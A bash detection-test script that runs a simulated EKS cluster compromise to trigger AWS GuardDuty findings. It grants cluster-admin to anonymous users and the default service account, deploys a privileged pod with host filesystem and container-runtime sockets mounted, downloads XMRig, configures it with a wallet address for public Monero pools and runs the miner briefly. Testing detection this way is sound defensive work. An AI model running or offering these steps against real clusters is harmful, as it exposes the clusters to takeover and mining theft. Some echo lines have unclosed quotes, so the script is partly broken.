#!/bin/bash
echo "=== AttackSequence:EKS/CompromisedCluster Detection Test ===
echo "MITRE ATT&CK tactics: Impact, Execution, Privilege Escalation, Credential Access"
echo "MITRE ATT&CK techniques: T1098, T1204.002, T1098.006, T1552.001, T1496"
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_status() { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
print_stage() { echo -e "${BLUE}[ATTACK]${NC} $1"; }
print_critical() { echo -e "${RED}[CRITICAL]${NC} $1"; }

countdown() {
    local seconds=$1
    local message=$2
    echo -e "${CYAN}[COUNTDOWN]${NC} $message"
    for ((i=seconds; i>0; i--)); do
        echo -ne "${CYAN}[COUNTDOWN]${NC} $i seconds remaining...\r"
        sleep 1
    done
    echo -e "${CYAN}[COUNTDOWN]${NC} Proceeding...                    "
}

# Prerequisites check
if ! command -v kubectl &> /dev/null; then
    print_error "kubectl is not installed"
    exit 1
fi

if ! kubectl cluster-info &> /dev/null; then
    print_error "Cannot connect to Kubernetes cluster"
    exit 1
fi

AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "unknown")
AWS_REGION=$(aws configure get region 2>/dev/null || echo "us-east-1")
CLUSTER_NAME=$(kubectl config current-context | cut -d':' -f6 2>/dev/null || echo "unknown")

print_status "Connected to cluster: $(kubectl config current-context)"
print_status "AWS Account: $AWS_ACCOUNT_ID, Region: $AWS_REGION, Cluster: $CLUSTER_NAME"

print_critical "=== ATTACK SEQUENCE TEST ==="
echo "Target findings:"
echo "  • Execution:Kubernetes/MaliciousFile"
echo "  • Policy:Kubernetes/AnonymousAccessGranted"
echo "  • Policy:Kubernetes/AdminAccessToDefaultServiceAccount"
echo "  • Impact:Runtime/CryptoMinerExecuted"
echo "  • CryptoCurrency:Runtime/BitcoinTool.B!DNS"
echo "  • CryptoCurrency:Runtime/BitcoinTool.B"
echo ""

# =============================================================================
# CLEANUP AND SETUP
# =============================================================================
print_stage "Phase 0: Cleanup and Setup"

print_status "Cleaning up existing resources..."
kubectl delete pod comprehensive-attack-workload --ignore-not-found=true
kubectl delete serviceaccount comprehensive-attack-sa --ignore-not-found=true
kubectl delete clusterrolebinding comprehensive-attack-binding --ignore-not-found=true
kubectl delete clusterrolebinding comprehensive-anonymous-access --ignore-not-found=true
kubectl delete clusterrolebinding comprehensive-default-admin --ignore-not-found=true

sleep 30 # Give cleanup time to complete

# =============================================================================
# PHASE 1: ANONYMOUS ACCESS POLICY FINDINGS
# =============================================================================
print_stage "Phase 1: Anonymous Access Policy Configuration"

print_status "Creating comprehensive anonymous access configuration..."

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: comprehensive-anonymous-access
  annotations:
    attack-simulation: "anonymous-access-grant"
    attack-simulation: "Policy:Kubernetes/AnonymousAccessGranted"
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

countdown 45 "Waiting for RBAC propagation..."

print_status "Triggering multiple anonymous access attempts..."

# Execute multiple anonymous access tests
for i in {1..7}; do
    print_status "Anonymous access attempt $i/7..."
    kubectl --token="" get secrets --all-namespaces 2>/dev/null || echo "Anonymous secret access $i attempted"
    kubectl --token="" get pods --all-namespaces 2>/dev/null || echo "Anonymous pod discovery $i attempted"
    kubectl --token="" get nodes 2>/dev/null || echo "Anonymous node access $i attempted"
    kubectl --token="" get serviceaccounts --all-namespaces 2>/dev/null || echo "Anonymous SA access $i attempted"
    sleep 10 # Space out the attempts
done

countdown 30 "Waiting for anonymous access policy signals..."

# =============================================================================
# PHASE 2: DEFAULT SERVICE ACCOUNT ADMIN ACCESS
# =============================================================================
print_stage "Phase 2: Default Service Account Admin Access"

print_status "Creating default service account admin access..."

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: comprehensive-default-admin
  annotations:
    attack-simulation: "default-service-account-admin"
    attack-simulation: "Policy:Kubernetes/AdminAccessToDefaultServiceAccount"
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

countdown 45 "Waiting for default SA admin RBAC propagation..."

print_status "Triggering default service account admin operations..."

# Execute operations using default service account
for i in {1..4}; do
    print_status "Default SA admin operation $i/4..."
    kubectl auth can-i "*" "*" --as=system:serviceaccount:default:default 2>/dev/null || echo "Default SA admin check $i attempted"
    sleep 15 # Space out the operations
done

countdown 30 "Waiting for default SA admin policy signals..."

# =============================================================================
# PHASE 3: ENHANCED SERVICE ACCOUNT AND WORKLOAD CREATION
# =============================================================================
print_stage "Phase 3: Enhanced Service Account and Privileged Workload"

print_status "Creating enhanced service account with comprehensive role binding..."

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: comprehensive-attack-sa
  namespace: default
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/eks-node-group-role
    attack-simulation: "comprehensive-privileged-escalation"
    attack-simulation: "comprehensive-attack-binding"
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: comprehensive-attack-binding
  annotations:
    attack-simulation: "comprehensive-privilege-escalation-binding"
    attack-simulation: "cluster-admin-role-binding"
subjects:
- kind: ServiceAccount
  name: comprehensive-attack-sa
  namespace: default
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

countdown 45 "Waiting for enhanced RBAC propagation..."

print_status "Deploying comprehensive privileged attack workload..."

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: comprehensive-attack-workload
  namespace: default
  labels:
    app: comprehensive-attack
    attack-type: privilege-escalation
    security-context: privileged-root
    attack-simulation: "comprehensive-attack-workload"
  annotations:
    attack-simulation: "comprehensive-privileged-container-deployment"
    security-risk: "critical-privileged-access"
spec:
  serviceAccountName: comprehensive-attack-sa
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: comprehensive-attack-container
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
      runAsUser: 0
      allowPrivilegeEscalation: true
      readOnlyRootFilesystem: false
      capabilities:
        add:
        - SYS_ADMIN
        - NET_ADMIN
        - SYS_PTRACE
        - SYS_CHROOT
        - MKNOD
        - AUDIT_WRITE
        - SETFCAP
        - DAC_OVERRIDE
        - FOWNER
        - SETUID
        - SETGID
    resources:
      requests:
        memory: "256Mi"
        cpu: "100m"
      limits:
        memory: "512Mi"
        cpu: "300m"
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: host-proc
      mountPath: /host-proc
    - name: host-sys
      mountPath: /host-sys
    - name: host-dev
      mountPath: /host-dev
    - name: host-etc
      mountPath: /host-etc
    - name: host-var-log
      mountPath: /host-var-log
    - name: docker-sock
      mountPath: /var/run/docker.sock
    - name: containerd-sock
      mountPath: /run/containerd/containerd.sock
    env:
    - name: AWS_DEFAULT_REGION
      value: "${AWS_REGION}"
    - name: CLUSTER_NAME
      value: "${CLUSTER_NAME}"
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: host-proc
    hostPath:
      path: /proc
  - name: host-sys
    hostPath:
      path: /sys
  - name: host-dev
    hostPath:
      path: /dev
  - name: host-etc
    hostPath:
      path: /etc
  - name: host-var-log
    hostPath:
      path: /var/log
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
  - name: containerd-sock
    hostPath:
      path: /run/containerd/containerd.sock
  restartPolicy: Never
EOF

print_status "Waiting for comprehensive attack workload to be ready..."
kubectl wait --for=condition=Ready pod/comprehensive-attack-workload --timeout=180s

countdown 60 "Waiting for privileged container detection..."

# =============================================================================
# PHASE 4: MALWARE DEPLOYMENT
# =============================================================================
print_stage "Phase 4: Malware Deployment"

print_status "Deploying XMRig cryptocurrency miner..."

kubectl exec comprehensive-attack-workload -- bash -c "
echo '=== MALWARE DEPLOYMENT FOR EXECUTION:KUBERNETES/MALICIOUSFILE ==='
cd /tmp

# Install required tools
export DEBIAN_FRONTEND=noninteractive
apt update -qq && apt install -y curl wget dnsutils netcat-openbsd > /dev/null 2>&1

# Download real XMRig binary
echo 'Downloading XMRig cryptocurrency miner (known malware signature)...'
wget -q --timeout=30 https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz || \\
curl -s -L --max-time 30 -o xmrig-6.21.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz

if [ -f xmrig-6.21.0-linux-x64.tar.gz ]; then
    echo 'Extracting XMRig binary...'
    tar -xzf xmrig-6.21.0-linux-x64.tar.gz
    chmod +x xmrig-6.21.0/xmrig
    
    # Deploy to strategic locations
    cp xmrig-6.21.0/xmrig /tmp/cryptominer
    cp xmrig-6.21.0/xmrig /tmp/xmrig
    cp xmrig-6.21.0/xmrig /tmp/malware_sample
    cp xmrig-6.21.0/xmrig /usr/local/bin/miner 2>/dev/null || cp xmrig-6.21.0/xmrig /tmp/miner
    
    echo 'XMRig binaries deployed'
    ls -la /tmp/xmrig /tmp/cryptominer /tmp/malware_sample
    
    echo 'XMRig deployment completed'
else
    echo 'Failed to download XMRig binary'
fi

# Create comprehensive miner configuration
cat > /tmp/comprehensive_miner_config.json << 'CONFIG_EOF'
{
    \"pools\": [
        {
            \"algo\": \"rx/0\",
            \"coin\": \"XMR\",
            \"url\": \"pool.supportxmr.com:3333\",
            \"user\": \"47v4BWeUPFrM9fch67tEmcJyBtZw99bddAyACFsRP5YNbdBKPUJLahjBNDJ8JCu4UUcKhNWHYvKhgcN9kZqhXqLGRfX9Q6A\",
            \"pass\": \"comprehensive-attack-worker\",
            \"keepalive\": true,
            \"enabled\": true
        },
        {
            \"algo\": \"rx/0\",
            \"coin\": \"XMR\",
            \"url\": \"gulf.moneroocean.stream:10032\",
            \"user\": \"47v4BWeUPFrM9fch67tEmcJyBtZw99bddAyACFsRP5YNbdBKPUJLahjBNDJ8JCu4UUcKhNWHYvKhgcN9kZqhXqLGRfX9Q6A\",
            \"pass\": \"comprehensive-attack-worker\",
            \"keepalive\": true,
            \"enabled\": true
        }
    ]
}
CONFIG_EOF

echo 'Comprehensive miner configuration created'
"

countdown 45 "Waiting for malware detection signals..."

# =============================================================================
# PHASE 5: CRYPTOCURRENCY DNS QUERIES
# =============================================================================
print_stage "Phase 5: Cryptocurrency DNS Queries"

print_status "Performing cryptocurrency DNS queries..."

kubectl exec comprehensive-attack-workload -- bash -c "
echo '=== CRYPTOCURRENCY DNS QUERIES FOR BITCOINTOOL.B!DNS DETECTION ==='

# Cryptocurrency domains
CRYPTO_DOMAINS='
crypto.guarddutyc2activityb.com
gulf.moneroocean.stream
xmr.pool.minergate.com
pool.supportxmr.com
pool.hashvault.pro
pool.minergate.com
'

echo 'Performing DNS queries to cryptocurrency domains...'
for domain in \$CRYPTO_DOMAINS; do
    echo \"Querying crypto domain: \$domain\"
    nslookup \$domain > /dev/null 2>&1 || echo \"DNS query for \$domain completed\"
    dig \$domain > /dev/null 2>&1 || echo \"DNS dig for \$domain completed\"
    sleep 5
done

echo 'Cryptocurrency DNS queries completed'
"

countdown 30 "Waiting for cryptocurrency DNS detection signals..."

# =============================================================================
# PHASE 6: CRYPTOCURRENCY MINING EXECUTION
# =============================================================================
print_stage "Phase 6: Cryptocurrency Mining Execution"

print_status "Executing cryptocurrency mining processes..."

kubectl exec comprehensive-attack-workload -- bash -c "
echo '=== CRYPTOCURRENCY MINING EXECUTION ===
cd /tmp

if [ -f xmrig-6.21.0/xmrig ]; then
    echo 'Starting XMRig cryptocurrency mining processes...'
    
    # Test connectivity to mining pools
    echo 'Testing connectivity to cryptocurrency mining pools...'
    nc -zv pool.supportxmr.com 3333 2>/dev/null || echo 'Connection to pool.supportxmr.com:3333 attempted'
    nc -zv gulf.moneroocean.stream 10032 2>/dev/null || echo 'Connection to gulf.moneroocean.stream:10032 attempted'
    nc -zv xmr.pool.minergate.com 45700 2>/dev/null || echo 'Connection to xmr.pool.minergate.com:45700 attempted'
    
    # Start first cryptomining process (Process 1)
    echo 'Starting XMRig cryptocurrency mining process 1...'
    timeout 45 ./xmrig-6.21.0/xmrig --config=comprehensive_miner_config.json --threads=2 --log-file=/tmp/xmrig_process1.log > /dev/null 2>&1 &
    XMRIG_PID1=\$!
    echo \"XMRig process 1 started with PID: \$XMRIG_PID1\"
    
    sleep 10
    
    # Start second cryptomining process (Process 2) 
    echo 'Starting cryptominer process 2...'
    timeout 45 ./cryptominer --donate-level=1 --url=pool.supportxmr.com:3333 --user=test --pass=worker --threads=1 > /dev/null 2>&1 &
    CRYPTO_PID2=\$!
    echo \"Cryptominer process 2 started with PID: \$CRYPTO_PID2\"
    
    # Let both processes run for detection
    echo 'Both cryptocurrency mining processes running for enhanced detection...'
    sleep 45
    
    # Graceful termination
    echo 'Terminating cryptocurrency mining processes...'
    kill \$XMRIG_PID1 2>/dev/null || echo 'XMRig process 1 already terminated'
    kill \$CRYPTO_PID2 2>/dev/null || echo 'Cryptominer process 2 already terminated'
    
    # Check logs
    if [ -f /tmp/xmrig_process1.log ]; then
        echo 'XMRig process 1 log created:'
        head -3 /tmp/xmrig_process1.log 2>/dev/null || echo 'Log exists but cannot read'
    fi
    
    echo 'Cryptocurrency mining execution completed'
else
    echo 'XMRig binary not found, skipping mining execution'
fi
"

countdown 45 "Waiting for cryptocurrency mining execution signals..."

# =============================================================================
# COMPLETION AND MONITORING
# =============================================================================
print_status "Attack sequence execution completed - monitoring for correlation..."

countdown 60 "Final signal correlation period..."

echo ""
print_critical "=== ATTACK SEQUENCE COMPLETED ==="
echo ""
echo "Successfully executed all attack phases:"
echo "  ✓ Phase 1: Anonymous access policy configuration"
echo "  ✓ Phase 2: Default service account admin access"
echo "  ✓ Phase 3: Enhanced service account and privileged workload"
echo "  ✓ Phase 4: XMRig malware deployment"
echo "  ✓ Phase 5: Cryptocurrency DNS queries"
echo "  ✓ Phase 6: Cryptocurrency mining execution"
echo ""
echo "MITRE ATT&CK techniques:"
echo "  • T1098 - Account Manipulation ✓"
echo "  • T1204.002 - User Execution: Malicious File ✓"
echo "  • T1098.006 - Account Manipulation: Additional Container Cluster Roles ✓"
echo "  • T1552.001 - Unsecured Credentials: Credentials In Files ✓"
echo "  • T1496 - Resource Hijacking ✓"
echo ""
echo "Expected Detection Timeline:"
echo "  • 5-10 minutes: Policy findings (Anonymous access, Default SA admin)"
echo "  • 5-10 minutes: Runtime Monitoring findings (CryptoMiner, DNS queries)"
echo "  • 10-25 minutes: Malware Protection findings"
echo "  • 30-90 minutes: AttackSequence:EKS/CompromisedCluster correlation"
echo ""
print_warning "Monitor GuardDuty console for AttackSequence:EKS/CompromisedCluster finding"
print_warning "Monitor for signals with comprehensive-attack-workload and comprehensive-attack-binding"
print_status "Attack sequence completed! Check GuardDuty in 30-90 minutes."
